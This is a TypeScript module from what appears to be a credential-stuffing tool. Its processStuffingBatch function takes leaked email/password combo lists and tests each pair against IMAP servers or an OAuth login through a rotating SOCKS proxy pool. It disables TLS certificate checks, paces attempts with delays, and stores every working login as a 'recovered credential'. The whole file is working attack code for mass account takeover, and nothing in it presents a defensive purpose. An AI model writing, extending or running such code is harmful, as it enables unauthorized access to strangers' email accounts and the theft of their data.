import imaps from "imap-simple";
import { SocksClient } from "socks";
import * as net from "net";
import { OAuthClient } from "../oauth/client.js";
import { HttpClient } from "../http/client.js";
import { getImapConfig } from "../imap/host-resolver.js";
import { ProxyPoolManager, type PoolProxy } from "../scaling/proxy-pool.js";
import { markComboChecked } from "../combolist/importer.js";
import { saveRecoveredCredential } from "../matching/recovered-credentials.js";
import { AuthSuccessDetector } from "../matching/success-detector.js";
import type { StuffingItem } from "../scaling/distributed-queue.js";

export interface StuffingResult {
  checked: number;
  found: number;
  failed: number;
  errors: number;
}

function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}

async function tryImapWithProxy(
  host: string,
  port: number,
  user: string,
  password: string,
  proxy: PoolProxy | null,
  timeout = 15_000,
): Promise<boolean> {
  try {
    let socketOverride: net.Socket | undefined;

    // If proxy available, create SOCKS tunnel first
    if (proxy && (proxy.protocol === "socks5" || proxy.protocol === "socks4")) {
      const socksType = proxy.protocol === "socks5" ? 5 : 4;
      const { socket } = await SocksClient.createConnection({
        proxy: {
          host: proxy.host,
          port: proxy.port,
          type: socksType,
          userId: proxy.username ?? undefined,
          password: proxy.password ?? undefined,
        },
        command: "connect",
        destination: { host, port },
        timeout,
      });
      socketOverride = socket;
    }

    const connection = await imaps.connect({
      imap: {
        user,
        password,
        host,
        port,
        tls: true,
        authTimeout: timeout,
        connTimeout: timeout,
        tlsOptions: { rejectUnauthorized: false, socket: socketOverride },
      },
    });

    await connection.end();
    return true;
  } catch {
    return false;
  }
}

async function tryOAuthWithProxy(
  email: string,
  password: string,
  proxy: PoolProxy | null,
): Promise<boolean> {
  try {
    const proxyEntry = proxy
      ? {
          id: proxy.id,
          host: proxy.host,
          port: proxy.port,
          protocol: proxy.protocol,
          username: proxy.username,
          password: proxy.password,
          status: "alive",
          latency: null,
          country: null,
          lastCheck: null,
          failCount: 0,
          createdAt: new Date(),
        }
      : undefined;

    const httpClient = new HttpClient();
    const oauthClient = new OAuthClient(httpClient);
    const result = await oauthClient.authenticate(
      null,
      email,
      password,
      {},
      proxyEntry as any,
    );
    return result.success;
  } catch {
    return false;
  }
}

export async function processStuffingBatch(
  items: StuffingItem[],
  userId: number,
  method: "imap" | "oauth",
  proxyPool: ProxyPoolManager,
  delayMs = 500,
): Promise<StuffingResult> {
  const detector = new AuthSuccessDetector();
  let found = 0;
  let failed = 0;
  let errors = 0;

  const successIds: number[] = [];
  const failIds: number[] = [];

  for (const item of items) {
    const proxy = proxyPool.getNext();

    try {
      let success = false;

      if (method === "oauth") {
        success = await tryOAuthWithProxy(item.email, item.password, proxy);
      } else {
        const imapConfig = getImapConfig(item.email);
        if (!imapConfig) {
          failIds.push(item.comboId!);
          failed++;
          continue;
        }
        success = await tryImapWithProxy(
          imapConfig.host,
          imapConfig.port,
          item.email,
          item.password,
          proxy,
        );
      }

      if (success) {
        found++;
        successIds.push(item.comboId!);

        const detection = await detector.detect(item.email, item.password, method);
        await saveRecoveredCredential(
          userId,
          item.email,
          item.password,
          detection,
          method,
        ).catch(() => {});

        if (proxy) proxyPool.markSuccess(proxy.id);
      } else {
        failed++;
        failIds.push(item.comboId!);
      }
    } catch {
      errors++;
      failIds.push(item.comboId!);
      if (proxy) proxyPool.markFailed(proxy.id);
    }

    await sleep(delayMs);
  }

  if (successIds.length > 0) {
    await markComboChecked(successIds.filter(Boolean), "success");
  }
  if (failIds.length > 0) {
    await markComboChecked(failIds.filter(Boolean), "failed");
  }

  return { checked: items.length, found, failed, errors };
}
